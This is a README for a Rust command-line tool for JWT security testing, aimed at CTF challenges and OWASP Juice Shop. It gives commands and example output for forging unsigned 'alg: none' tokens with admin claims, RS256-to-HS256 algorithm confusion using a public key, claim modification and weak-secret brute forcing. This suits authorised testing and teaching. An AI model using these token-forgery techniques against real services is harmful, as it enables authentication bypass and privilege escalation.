# jwt-tool

JWT manipulation tool for security testing.

## Installation

```bash
cargo build --release
# Binary: target/release/jwt-tool
```

## Usage

### Decode JWT

Decode a JWT without signature verification:

```bash
jwt-tool decode "eyJhbGciOiJIUzI1NiIs..."
```

Output:
```
=== JWT Decoded ===

Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload:
{
  "sub": "1234567890",
  "name": "John Doe"
}

Algorithm: HS256
Signature: 32 bytes
```

### Create Unsigned JWT (alg: none)

```bash
jwt-tool unsigned '{"role": "admin", "user": "test"}'
```

Output:
```
=== Unsigned JWT (alg: none) ===

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoidGVzdCJ9.

Note: Some servers accept tokens ending with '.' or without signature.
```

### Create HS256 Signed JWT

```bash
jwt-tool hs256 '{"role": "admin"}' "secret-key"
```

For algorithm confusion attacks (RS256 -> HS256):
```bash
jwt-tool hs256 '{"role": "admin"}' "$(cat public_key.pem)"
```

### Modify JWT Claims

```bash
jwt-tool modify "eyJhbGci..." '{"role": "admin"}'
```

### List Algorithm Variants

```bash
jwt-tool algorithms
```

Shows algorithm variants for testing:
- `none`, `None`, `NONE`, `nOnE`
- HS256, HS384, HS512
- RS256, RS384, RS512

### Juice Shop Challenges

```bash
jwt-tool juice-shop
```

Shows JWT attack vectors for OWASP Juice Shop challenges.

## Attack Vectors

### Algorithm None Attack
1. Decode existing JWT
2. Create unsigned JWT with modified claims
3. Replace token in application

### Algorithm Confusion (RS256 -> HS256)
1. Obtain server's public key
2. Create HS256 token using public key as secret
3. Server verifies using public key (thinking it's symmetric)

### Weak Secret Brute Force
- Use tools like `hashcat` or `john` with wordlists
- Common weak secrets: `secret`, `password`, `key`

## Use Cases

### CTF Challenges
- Bypass JWT authentication
- Escalate privileges via claim modification

### Security Testing
- Test algorithm confusion vulnerabilities
- Verify signature validation
- Test claim injection
